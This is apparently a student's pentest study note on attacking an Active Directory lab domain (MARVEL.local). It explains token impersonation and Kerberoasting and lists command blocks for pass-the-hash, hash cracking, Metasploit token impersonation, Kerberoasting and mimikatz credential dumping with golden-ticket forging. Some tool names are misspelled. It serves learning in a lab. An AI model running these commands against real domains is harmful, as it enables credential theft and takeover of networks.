#windows #active #internalPentest  

![Exported image](Exported%20image%2020241212232319-0.png)  
![Exported image](Exported%20image%2020241212232321-1.png)  
![Exported image](Exported%20image%2020241212232327-2.png)  
![Exported image](Exported%20image%2020241212232329-3.png)  
![Exported image](Exported%20image%2020241212232332-4.png)  
![Exported image](Exported%20image%2020241212232333-5.png)  
![Exported image](Exported%20image%2020241212232336-6.png)  
![Exported image](Exported%20image%2020241212232338-7.png)  
![Exported image](Exported%20image%2020241212232340-8.png)
![Pasted image 20250319172502](Pasted%20image%2020250319172502.png)


![Exported image](Exported%20image%2020241212232345-9.png)  
![Exported image](Exported%20image%2020241212232347-10.png)  
![Exported image](Exported%20image%2020241212232349-11.png)  
![Exported image](Exported%20image%2020241212232351-12.png)  
![Exported image](Exported%20image%2020241212232353-13.png)  
![Exported image](Exported%20image%2020241212232355-14.png)  
![Exported image](Exported%20image%2020241212232357-15.png)  
![Exported image](Exported%20image%2020241212232402-16.png)  
![Exported image](Exported%20image%2020241212232404-17.png)  
![Exported image](Exported%20image%2020241212232407-18.png)  
![Exported image](Exported%20image%2020241212232409-19.png)  
![Exported image](Exported%20image%2020241212232411-20.png)

### 1️⃣ **Impersonate Token**

- **Definition**: Allows a process to act **on behalf of a user** but only on the local system.
- **Limitations**: Cannot access network resources as the user.
- **Example**:
    - You log into a **Windows server** and run a script that requires admin access.
    - The script uses an **Impersonate Token** to act as **you** and make changes to files on the same system.
    - But if the script tries to access a **network drive**, it fails because impersonation does not extend beyond the local system.

---

### 2️⃣ **Delegate Token**

- **Definition**: Allows a process to **fully act as the user**, including accessing network resources.
- **Use Case**: Used in **Single Sign-On (SSO)** scenarios where a service needs to access another service on behalf of the user.
- **Example**:
    - You log into a **corporate network** from your laptop.
    - You open Outlook, which connects to a mail server.
    - The mail server needs to fetch your emails from another system.
    - It uses a **Delegate Token** to act as **you** and retrieve your emails from the email storage system.




![Exported image](Exported%20image%2020241212232413-21.png)  
![Exported image](Exported%20image%2020241212232415-22.png)  
![Exported image](Exported%20image%2020241212232420-23.png)  
![Exported image](Exported%20image%2020241212232422-24.png)  
![Exported image](Exported%20image%2020241212232424-25.png)  
![Exported image](Exported%20image%2020241212232426-26.png)  
![Exported image](Exported%20image%2020241212232428-27.png)  
![Exported image](Exported%20image%2020241212232430-28.png)  
![Exported image](Exported%20image%2020241212232432-29.png)  
![Exported image](Exported%20image%2020241212232437-30.png)  
![Exported image](Exported%20image%2020241212232439-31.png)  
![Exported image](Exported%20image%2020241212232442-32.png)  
![Exported image](Exported%20image%2020241212232444-33.png)  
![Exported image](Exported%20image%2020241212232445-34.png)  
![Exported image](Exported%20image%2020241212232447-35.png)  
![Exported image](Exported%20image%2020241212232449-36.png)  
![Exported image](Exported%20image%2020241212232454-37.png)  
![Exported image](Exported%20image%2020241212232456-38.png)  
![Exported image](Exported%20image%2020241212232457-39.png)  
![Exported image](Exported%20image%2020241212232459-40.png)  
![Exported image](Exported%20image%2020241212232501-41.png)  
![Exported image](Exported%20image%2020241212232503-42.png)  
![Exported image](Exported%20image%2020241212232505-43.png)  
![Exported image](Exported%20image%2020241212232510-44.png)

---
### **Explaination for Kerborosting**

- SPN = Service Principle name
- TGT = Ticket Granting Ticket
- TGS = Ticket Granting Service

- **First  you will reqest an TGT from domain controller with providing an username and password provide and then the domian controller will give you an TGT token**
- **Then Using that TGT token you will request an TGS token**
- **Then you will recive an TGS token with an Server account hash the domain controller will encrypt the hash using the key form Application server**
- **Present the TGS with the server account hash to the application server then it will decrypt it  than authenticate you**
- **where we can get malicious on the 4 step when we recive the Server account hash we can take it offline and crack it**



![Exported image](Exported%20image%2020241212232512-45.png)  
![Exported image](Exported%20image%2020241212232515-46.png)  
![Exported image](Exported%20image%2020241212232520-47.png)  
![Exported image](Exported%20image%2020241212232523-48.png)  
![Exported image](Exported%20image%2020241212232526-49.png)  
![Exported image](Exported%20image%2020241212232528-50.png)  
![Exported image](Exported%20image%2020241212232533-51.png)  
![Exported image](Exported%20image%2020241212232535-52.png)  
![Exported image](Exported%20image%2020241212232537-53.png)  
![Exported image](Exported%20image%2020241212232539-54.png)  
![Exported image](Exported%20image%2020241212232540-55.png)  
![Exported image](Exported%20image%2020241212232542-56.png)  
![Exported image](Exported%20image%2020241212232543-57.png)  
![Exported image](Exported%20image%2020241212232548-58.png)  
![Exported image](Exported%20image%2020241212232550-59.png)  
![Exported image](Exported%20image%2020241212232551-60.png)  
![Exported image](Exported%20image%2020241212232553-61.png)  
![Exported image](Exported%20image%2020241212232555-62.png)

Groups.xml is what you are looking for

![Exported image](Exported%20image%2020241212232557-63.png)  
![Exported image](Exported%20image%2020241212232558-64.png)  
![Exported image](Exported%20image%2020241212232603-65.png)  
![Exported image](Exported%20image%2020241212232604-66.png)  
![Exported image](Exported%20image%2020241212232606-67.png)  
![Exported image](Exported%20image%2020241212232607-68.png)  
![Exported image](Exported%20image%2020241212232609-69.png)  
![Exported image](Exported%20image%2020241212232611-70.png)  
![Exported image](Exported%20image%2020241212232612-71.png)  
![Exported image](Exported%20image%2020241212232619-72.png)  
![Exported image](Exported%20image%2020241212232621-73.png)  
![Exported image](Exported%20image%2020241212232624-74.png)  
![Exported image](Exported%20image%2020241212232626-75.png)  
![Exported image](Exported%20image%2020241212232629-76.png)  
![Exported image](Exported%20image%2020241212232632-77.png)  
![Exported image](Exported%20image%2020241212232634-78.png)  
![Exported image](Exported%20image%2020241212232641-79.png)  
![Exported image](Exported%20image%2020241212232644-80.png)  
![Exported image](Exported%20image%2020241212232646-81.png)  
![Exported image](Exported%20image%2020241212232648-82.png)  
![Exported image](Exported%20image%2020241212232649-83.png)  
![Exported image](Exported%20image%2020241212232653-84.png)  
![Exported image](Exported%20image%2020241212232654-85.png)  
![Exported image](Exported%20image%2020241212232700-86.png)  
![Exported image](Exported%20image%2020241212232701-87.png)

Golden ticket

![Exported image](Exported%20image%2020241212232704-88.png)  
![Exported image](Exported%20image%2020241212232706-89.png)  
![Exported image](Exported%20image%2020241212232708-90.png)  
![Exported image](Exported%20image%2020241212232710-91.png)  
![Exported image](Exported%20image%2020241212232712-92.png)  
![Exported image](Exported%20image%2020241212232717-93.png)  
![Exported image](Exported%20image%2020241212232719-94.png)  
![Exported image](Exported%20image%2020241212232721-95.png)  
![Exported image](Exported%20image%2020241212232723-96.png)  
![Exported image](Exported%20image%2020241212232725-97.png)  
![Exported image](Exported%20image%2020241212232727-98.png)  
![Exported image](Exported%20image%2020241212232729-99.png)  
![Exported image](Exported%20image%2020241212232734-100.png)  
![Exported image](Exported%20image%2020241212232738-101.png)  
![Exported image](Exported%20image%2020241212232741-102.png)  
![Exported image](Exported%20image%2020241212232743-103.png)

---

## **PassTheHash Commands**

---


```
nxc smb 192.168.72.0/24 -u fcastel -d MARVEL.local -p password@123 

nxc smb 192.168.72.0/24 -u fcastel -d MARVEL.local -p password@123 --sam

psexec.py marvel/fcastel:password@123@192.168.72.129

secretsdumpp.py marvel/fcastel:password@123@192.168.72.129

hashcat -m 1000 hash.txt rockyou.txt

nxc smb 192.168.72.0/24 -u "Frank castel" -H thehashyougotfromsecretsdump --local

psexec.py "frank castel":@192.168.72.129 -hashes thehashyougotfromsecretsdump
```

---

## **Token Impersonation Commands**

-------

```
use exploit/windows/smb/psexec 
load incognito
list_tokens -u
impersonate_token marvel\\administrator

```


---
## **Kerberosting Commands**

---
```
setUserSPN.py marvel.local/fcastel:password@121 -dc-ip ipofthedomaincontroller -request

hashcat -m 13100 hash.txt rockyou.txt

```

---
## Mimicazt 

---
```
privilege::debug
sekurlsa::logonpasswords
lsadump::sam /patch
lsadump::lsa /inject /name:krbtgt

copy the sid and ntml hash

Kerberos::golden /User:Administrator /domain:marvel.local /sid:valueofthesid /krbtgt:valueofntmlhash /id:500 /ptt
misc::cmd
```

